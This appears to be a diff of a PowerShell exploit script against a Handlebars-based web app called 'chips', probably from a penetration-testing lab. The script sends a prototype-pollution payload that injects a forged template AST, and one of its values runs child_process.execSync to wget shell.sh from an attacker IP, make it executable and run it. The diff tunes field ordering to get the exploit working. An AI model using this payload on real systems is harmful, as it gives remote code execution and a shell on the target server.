@@ -15,11 +15,12 @@ Start-Sleep -Seconds 10
 
 $res = iwr -Uri http://chips/ | sls -Pattern '<!-- Using Handlebars as Templating Engine -->' | % -process {$_.Matches.Value}
 Write-Output "Templating engine: $res"
+
 $ip="192.168.119.234"
 $json_obj = @{
-  "connection"= @{
+  "connection"= [ordered]@{
     "type"="rdp";
-    "settings"= @{
+    "settings"=[ordered] @{
       "hostname"="rdesktop";
       "username"="abc";
       "password"="abc";
@@ -29,19 +30,20 @@ $json_obj = @{
       "client-name"="";
       "console"="false";
       "initial-program"="";
-      "__proto__" = @{
+      "__proto__" = [ordered]@{
         "type" = "Program";
         "body" = @(
-          @{
+          [ordered]@{
             "type" = "MustacheStatement";
             "path" =  0;
+            "loc" = 0;
             "params" = @(
-              @{
+              [ordered]@{
                 "type" = "NumberLiteral";
-                "value" = "process.mainModule.require('child_process').execSync('/usr/bin/wget http://$ip/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; sh /tmp/shell.sh &');";
+                #"type" = "BooleanLiteral"; this is also a viable alternative
+                "value" = "process.mainModule.require('child_process').execSync('/usr/bin/wget http://$ip/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; sh /tmp/shell.sh &')";
               }
             );
-            "loc" = 0
           };
         );
       }
